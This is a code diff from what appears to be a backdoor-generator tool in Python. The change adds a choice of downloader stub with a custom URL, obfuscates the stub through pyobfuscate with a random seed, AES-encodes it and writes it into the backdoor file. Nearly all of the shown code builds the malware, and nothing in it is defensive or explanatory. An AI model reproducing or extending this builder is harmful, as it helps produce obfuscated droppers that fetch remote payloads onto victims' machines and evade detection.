@@ -180,8 +180,17 @@ random.shuffle(myimports)
 random.shuffle(myendings)
 random.shuffle(mywindows)
 
-with open('stubs/downloader.py') as dl:
-	downloaderscript = dl.read().replace('***URL***', downurl)
+if args.customurl:
+	with open('stubs/downloader_cust.py') as dl:
+		downloaderscript = dl.read().replace('***URL***', downurl)
+else:
+	with open('stubs/downloader.py') as dl:
+		downloaderscript = dl.read().replace('***URL***', downurl)
+with open('tempobfs.py', 'wb') as o:
+	o.write(downloaderscript)
+obstime = subprocess.Popen('python pyobfuscate.py -s %s tempobfs.py' % (''.join(random.choice(string.ascii_letters + string.digits) for x in range(random.randint(25,80)))), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+downloaderscript = obstime.stdout.read()
+os.remove('tempobfs.py')
 downloader = EncodeAES(cipher, downloaderscript)
 
 with open(backdoorName, 'w') as f:
